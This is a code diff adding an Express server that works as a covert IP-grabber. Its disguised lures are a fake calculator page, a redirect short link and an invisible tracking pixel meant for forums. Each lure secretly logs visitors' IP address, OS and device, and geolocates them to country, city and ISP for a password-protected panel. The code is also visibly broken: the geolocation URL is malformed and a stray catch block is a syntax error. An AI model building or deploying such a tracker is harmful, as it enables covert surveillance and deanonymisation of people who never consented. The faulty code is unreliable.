@@ -1,0 +1,118 @@
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const fetch = require('node-fetch');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+const ADMIN_PASSWORD = "YOUR_SECRET_PASSWORD"; // Твой пароль для входа в панель
+const LOGS_FILE = path.join(__dirname, 'logs.json');
+
+app.use(express.json());
+app.use(express.static(__dirname));
+
+if (!fs.existsSync(LOGS_FILE)) {
+    fs.writeFileSync(LOGS_FILE, JSON.stringify([]));
+}
+
+// Функция-сборщик логов (Парсит IP, ОС, Браузер и запрашивает Гео-API) [1, 4]
+async function captureLog(req, sourceMethod, additionalData = "") {
+    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    if (ip.includes('::ffff:')) ip = ip.split('::ffff:')[1];
+    if (ip === '::1') ip = '127.0.0.1';
+
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    
+    // Определяем ОС [4]
+    let os = "Unknown OS";
+    if (userAgent.includes("Win")) os = "Windows";
+    if (userAgent.includes("Mac")) os = "macOS";
+    if (userAgent.includes("Linux")) os = "Linux";
+    if (userAgent.includes("Android")) os = "Android";
+    if (userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
+
+    // Определяем тип устройства [4]
+    let deviceType = /Mobile|Android|iPhone|iPad/i.test(userAgent) ? "📱 Мобильное" : "💻 Компьютер";
+
+    let geo = { country: "Локально", city: "Тест-нода", isp: "Локальный хост" };
+    
+    if (ip !== '127.0.0.1') {
+        try {
+            const geoRes = await fetch(`http://ip-api.com{ip}?lang=ru`);
+            const geoData = await geoRes.json();
+            if (geoData.status === 'success') {
+                geo = {
+                    country: geoData.country,
+                    city: geoData.city,
+                    isp: geoData.isp
+                };
+            }
+        } catch (err) {
+            console.error("Ошибка геопозиции:", err.message);
+        }
+    }
+
+    try {
+        const logs = JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8'));
+        logs.push({
+            id: Date.now() + Math.floor(Math.random() * 1000),
+            time: new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' }),
+            ip: ip,
+            device: deviceType,
+            os: os,
+            country: geo.country,
+            city: geo.city,
+            isp: geo.isp,
+            method: sourceMethod, // Калькулятор, ссылка или пиксель [1]
+            extra: additionalData
+        });
+        fs.writeFileSync(LOGS_FILE, JSON.stringify(logs, null, 2));
+    } catch (err) {
+        console.error("Ошибка записи лога:", err);
+    }
+}
+
+// 1. Ловушка-Калькулятор Militech [1]
+app.get('/', async (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+    await captureLog(req, "Калькулятор Militech");
+});
+
+// 2. Ловушка-Редирект (Перенаправляет на любую ссылку, например, на мем, но пишет IP) [1]
+app.get('/go', async (req, res) => {
+    const targetUrl = req.query.url || "https://google.com";
+    res.redirect(targetUrl);
+    await captureLog(req, "Короткая ссылка (Редирект)", `Назначение: ${targetUrl}`);
+});
+
+// 3. Ловушка-Пиксель (Невидимая картинка 1х1, можно вставить на любой сайт или форум) [1]
+app.get('/pixel.png', async (req, res) => {
+    // Отдаем реальный прозрачный пиксель в формате PNG [1]
+    const buf = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64');
+    res.writeHead(200, {
+        'Content-Type': 'image/png',
+        'Content-Length': buf.length
+    });
+    res.end(buf);
+    await captureLog(req, "Скрытый пиксель 1х1");
+});
+
+// Панель админа [4]
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'admin.html'));
+});
+
+// Безопасное API выгрузки логов
+app.post('/api/get-logs', (req, res) => {
+    const { password } = req.body;
+    if (password === ADMIN_PASSWORD) {
+        const logs = JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8'));
+        res.json({ success: true, logs: logs });
+    } else {
+        res.status(403).json({ success: false, message: "ОТКАЗАНО В ДОСТУПЕ: КЛЮЧ НЕ КОРРЕКТЕН" });
+    }
+} catch (err) {});
+
+app.listen(PORT, () => {
+    console.log(`[LOG_SERVER_ACTIVE]: Панель управления развернута на порту ${PORT}`);
+});
